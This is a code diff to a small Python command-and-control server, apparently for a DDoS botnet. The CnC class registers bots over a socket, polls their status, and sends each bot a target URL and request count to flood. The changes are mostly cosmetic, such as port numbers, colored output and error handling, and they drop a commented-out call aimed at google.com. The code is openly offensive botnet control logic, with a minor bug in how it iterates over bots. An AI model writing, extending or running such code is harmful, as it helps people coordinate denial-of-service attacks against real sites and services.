@@ -1,3 +1,6 @@
+import http.client
+
+from termcolor import cprint
 import requests
 import socket
 import json
@@ -16,16 +19,16 @@ class CnC:
         self.socket.listen(10)
 
     def run(self):
-        print("Running...")
+        cprint("Running...", "green")
 
         while True:
             client, address = self.socket.accept()
             address = address[0]
-            data = client.recv(1024)
-            if data == b"new":
+            data = client.recv(1024).decode("utf-8")
+            if data == "n":
                 self.bots.append(address)
                 print(f"bot {address} added")
-            elif data == b"close":
+            elif data == "c":
                 try:
                     self.bots.remove(address)
                     print(f"bot {address} removed")
@@ -35,15 +38,18 @@ class CnC:
                 raise RuntimeError("Bot message not recognized")
             client.close()
             print(self.list_clients())
-            response = requests.get(f"http://{address}:80/status")
-            print(response)
+            try:
+                response = requests.get(f"http://{address}:8080/info")
+                print(response.text)
+            except (http.client.RemoteDisconnected, requests.exceptions.ConnectionError) as e:
+                cprint(e, 'yellow')
 
     def send_requests(self, url, n):
         if len(self.bots) == 0:
             raise RuntimeError("No bot connected.")
 
         for client, _ in self.bots:
-            response = requests.post(f"http://{client}:80", json={'url': url, 'n': n})
+            response = requests.post(f"http://{client}:8080", json={'url': url, 'n': n})
 
     def list_clients(self):
         if self.bots:
@@ -63,5 +69,3 @@ PORT = 60000
 if __name__ == '__main__':
     cnc = CnC(HOST, PORT)
     cnc.run()
-
-    # bot.send_requests('https://google.com', 3)
